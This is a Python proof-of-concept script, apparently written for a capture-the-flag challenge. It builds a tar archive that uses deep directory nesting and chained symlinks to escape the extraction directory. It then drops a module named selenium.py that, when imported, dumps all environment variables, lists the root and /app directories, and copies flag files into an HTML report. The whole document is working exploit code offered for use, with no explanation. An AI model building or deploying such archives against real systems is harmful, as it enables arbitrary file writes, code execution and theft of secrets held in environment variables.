import tarfile
import os
import io
import sys

comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("poc.tar", mode="x") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
        
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../"
    tar.addfile(e)
    
    payload = b"""import os

try:
    html = "<h1>CTF Server Dump</h1>"
    
    html += "<h2>1. Environment Variables:</h2><pre>"
    for k, v in os.environ.items():
        html += f"{k}: {v}\\n"
    html += "</pre>"
    
    html += "<h2>2. Root Directory (/):</h2><pre>"
    try:
        files = os.listdir('/')
        html += "\\n".join(files)
        
        for f in files:
            if 'flag' in f.lower():
                with open('/' + f, 'r') as flag_file:
                    html += f"\\n\\n[+] Flag in /{f}: {flag_file.read()}"
    except Exception as e:
        html += str(e)
    html += "</pre>"
    
    html += "<h2>3. App Directory (/app):</h2><pre>"
    try:
        files = os.listdir('/app')
        html += "\\n".join(files)
        for f in files:
            if 'flag' in f.lower():
                with open('/app/' + f, 'r') as flag_file:
                    html += f"\\n\\n[+] Flag in /app/{f}: {flag_file.read()}"
    except Exception as e:
        html += str(e)
    html += "</pre>"

    with open('/app/report/my_flag.html', 'w') as f:
        f.write(html)
except Exception as e:
    with open('/app/report/my_flag.html', 'w') as f:
        f.write("Error: " + str(e))
"""
    
    n = tarfile.TarInfo("escape/selenium.py")
    n.type = tarfile.REGTYPE
    n.size = len(payload)
    tar.addfile(n, fileobj=io.BytesIO(payload))

print("[+] Đã tạo xong poc.tar")